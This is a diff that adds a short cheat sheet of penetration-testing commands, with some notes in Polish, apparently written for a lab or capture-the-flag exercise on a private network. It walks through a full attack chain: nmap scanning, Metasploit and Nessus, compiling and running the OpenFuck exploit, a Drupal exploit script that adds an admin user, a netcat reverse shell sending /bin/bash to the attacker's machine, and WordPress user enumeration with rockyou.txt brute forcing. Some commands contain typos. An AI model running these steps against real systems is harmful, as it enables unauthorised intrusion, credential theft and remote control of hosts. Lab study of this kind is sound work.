@@ -1,0 +1,22 @@
+bash ping_scan.sh
+id/whoami 		==>show who am i
+nmap -sn 192.168.12.1-255
+nmap -A 192.168.12.1-255
+nmap -sV -A 192.168.12.13 ==>showVersion Agresive scan
+openvas-start
+msfconsole -start matasploit
+search (drupal)		==>search exploit in msf
+/etc/init.d/nessusd start
+searchsploit Openfuck
+gcc -o Openfuck.c -lcrypto 		==>kompilacja
+./OpenFuck 0x6b 192.168.12.14 -c 50 	==>use compiled exploit OpenFuck
+set payload 				==>[Tab]-show avaliable payload
+show options		==> exploit option
+expliot 		==> start exploit
+shell 			==> start shell in meterpreter	
+python 34992.py -t http://192.168.12.12 --u user123 -p user123 ==>add admin user drupal
+nc -nclp 1234 						==> komenda w terminalu Kalego, nasłuchwanie połączenia
+nc -nv 192.168.12.8 1234 -e /bin/bash 			==> z poziomu drupal shella, nawiązanie połączenia
+dirb http://192.168.12.13 				==>dirbscan
+wpscan --url 192.168.12.13/wordpress -e u 	==> wordPress scan, find username
+wpscan --url 192.168.12.13/wordpress --usernames c0rrupt3d_brain --passwords /usr/share/wordlists/rockyou.txt 	==>brute force 
